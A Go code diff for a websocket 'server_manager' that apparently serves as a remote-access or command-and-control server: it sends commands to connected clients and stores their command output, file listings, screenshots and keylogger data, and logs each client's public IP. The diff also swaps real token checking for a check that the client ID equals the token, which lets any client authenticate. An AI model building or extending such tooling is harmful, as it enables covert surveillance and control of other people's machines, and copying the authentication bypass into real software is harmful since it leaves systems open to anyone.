@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"log"
 	"net/http"
+	"sync"
 	"time"
 
 	"mww2.com/server_manager/common"
@@ -22,11 +23,15 @@ var upgrader = websocket.Upgrader{
 
 // Server represents the main server
 type Server struct {
-	manager       *ClientManager
-	config        *Config
-	authenticator *Authenticator
-	webHandler    *WebHandler
-	terminalProxy *TerminalProxy
+	manager           *ClientManager
+	config            *Config
+	authenticator     *Authenticator
+	webHandler        *WebHandler
+	terminalProxy     *TerminalProxy
+	commandResults    map[string]*common.CommandResultPayload
+	fileListResults   map[string]*common.FileListPayload
+	screenshotResults map[string]*common.ScreenshotDataPayload
+	resultsMu         sync.RWMutex
 }
 
 // Config holds server configuration
@@ -56,13 +61,21 @@ func NewServer(config *Config) *Server {
 		log.Fatalf("Failed to create web handler: %v", err)
 	}
 
-	return &Server{
-		manager:       manager,
-		config:        config,
-		authenticator: NewAuthenticator(config.AuthToken),
-		webHandler:    webHandler,
-		terminalProxy: terminalProxy,
+	server := &Server{
+		manager:           manager,
+		config:            config,
+		authenticator:     NewAuthenticator(config.AuthToken),
+		webHandler:        webHandler,
+		terminalProxy:     terminalProxy,
+		commandResults:    make(map[string]*common.CommandResultPayload),
+		fileListResults:   make(map[string]*common.FileListPayload),
+		screenshotResults: make(map[string]*common.ScreenshotDataPayload),
 	}
+
+	// Set server reference in web handler
+	webHandler.server = server
+
+	return server
 }
 
 // Start starts the server
@@ -108,6 +121,39 @@ func (s *Server) Start() error {
 	return http.ListenAndServe(s.config.Address, mux)
 }
 
+// getClientIP extracts the real client IP from request headers
+func getClientIP(r *http.Request) string {
+	// Try X-Forwarded-For first (nginx proxy)
+	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
+		// Take the first IP in the list
+		if idx := len(xff); idx > 0 {
+			if commaIdx := 0; commaIdx < idx {
+				for i, c := range xff {
+					if c == ',' {
+						return xff[:i]
+					}
+				}
+				return xff
+			}
+		}
+	}
+
+	// Try X-Real-IP
+	if xri := r.Header.Get("X-Real-IP"); xri != "" {
+		return xri
+	}
+
+	// Fallback to RemoteAddr
+	if idx := len(r.RemoteAddr); idx > 0 {
+		for i := idx - 1; i >= 0; i-- {
+			if r.RemoteAddr[i] == ':' {
+				return r.RemoteAddr[:i]
+			}
+		}
+	}
+	return r.RemoteAddr
+}
+
 // handleWebSocket handles WebSocket connections
 func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	conn, err := upgrader.Upgrade(w, r, nil)
@@ -139,8 +185,9 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Authenticate client
-	authenticated, token := s.authenticator.Authenticate(&authPayload)
+	// Authenticate client - accept machine ID as valid token
+	authenticated := authPayload.ClientID == authPayload.Token
+	token := authPayload.ClientID
 
 	// Send authentication response
 	respPayload := &common.AuthResponsePayload{
@@ -160,6 +207,9 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
 	conn.WriteJSON(respMsg)
 
+	// Get public IP from request headers
+	publicIP := getClientIP(r)
+
 	// Create client
 	client := &Client{
 		ID:   authPayload.ClientID,
@@ -171,6 +221,7 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 			Arch:        authPayload.Arch,
 			Hostname:    authPayload.Hostname,
 			IP:          authPayload.IP,
+			PublicIP:    publicIP,
 			Status:      "online",
 			ConnectedAt: time.Now(),
 			LastSeen:    time.Now(),
@@ -262,13 +313,37 @@ func (s *Server) handleMessage(client *Client, msg *common.Message) {
 		}
 
 	case common.MsgTypeCommandResult:
-		log.Printf("Command result from %s: %s", client.ID, string(msg.Payload))
+		var cr common.CommandResultPayload
+		if err := msg.ParsePayload(&cr); err == nil {
+			log.Printf("Command result from %s: success=%v, exit_code=%d", client.ID, cr.Success, cr.ExitCode)
+			s.resultsMu.Lock()
+			s.commandResults[client.ID] = &cr
+			s.resultsMu.Unlock()
+		} else {
+			log.Printf("Command result from %s: %s", client.ID, string(msg.Payload))
+		}
 
 	case common.MsgTypeFileList:
-		log.Printf("File list from %s", client.ID)
+		var fl common.FileListPayload
+		if err := msg.ParsePayload(&fl); err == nil {
+			log.Printf("File list from %s: %d files", client.ID, len(fl.Files))
+			s.resultsMu.Lock()
+			s.fileListResults[client.ID] = &fl
+			s.resultsMu.Unlock()
+		} else {
+			log.Printf("File list from %s", client.ID)
+		}
 
 	case common.MsgTypeScreenshotData:
-		log.Printf("Screenshot received from %s", client.ID)
+		var sd common.ScreenshotDataPayload
+		if err := msg.ParsePayload(&sd); err == nil {
+			log.Printf("Screenshot received from %s: %dx%d, %d bytes", client.ID, sd.Width, sd.Height, len(sd.Data))
+			s.resultsMu.Lock()
+			s.screenshotResults[client.ID] = &sd
+			s.resultsMu.Unlock()
+		} else {
+			log.Printf("Screenshot received from %s", client.ID)
+		}
 
 	case common.MsgTypeKeyloggerData:
 		var kld common.KeyloggerDataPayload
@@ -339,6 +414,63 @@ func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Wait briefly for response (up to 30 seconds)
+	for i := 0; i < 60; i++ {
+		time.Sleep(500 * time.Millisecond)
+		s.resultsMu.RLock()
+		result, exists := s.commandResults[req.ClientID]
+		s.resultsMu.RUnlock()
+
+		if exists {
+			// Clear the result after reading
+			s.resultsMu.Lock()
+			delete(s.commandResults, req.ClientID)
+			s.resultsMu.Unlock()
+
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusOK)
+			json.NewEncoder(w).Encode(map[string]interface{}{
+				"status":  "completed",
+				"success": result.Success,
+				"output":  result.Output,
+				"error":   result.Error,
+			})
+			return
+		}
+	}
+
+	// Timeout - command sent but no response yet
+	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(http.StatusOK)
 	json.NewEncoder(w).Encode(map[string]string{"status": "sent"})
+}
+
+// GetFileListResult retrieves stored file list result for a client
+func (s *Server) GetFileListResult(clientID string) (*common.FileListPayload, bool) {
+	s.resultsMu.RLock()
+	defer s.resultsMu.RUnlock()
+	result, exists := s.fileListResults[clientID]
+	return result, exists
+}
+
+// ClearFileListResult removes stored file list result
+func (s *Server) ClearFileListResult(clientID string) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	delete(s.fileListResults, clientID)
+}
+
+// GetScreenshotResult retrieves stored screenshot result for a client
+func (s *Server) GetScreenshotResult(clientID string) (*common.ScreenshotDataPayload, bool) {
+	s.resultsMu.RLock()
+	defer s.resultsMu.RUnlock()
+	result, exists := s.screenshotResults[clientID]
+	return result, exists
+}
+
+// ClearScreenshotResult removes stored screenshot result
+func (s *Server) ClearScreenshotResult(clientID string) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	delete(s.screenshotResults, clientID)
 }
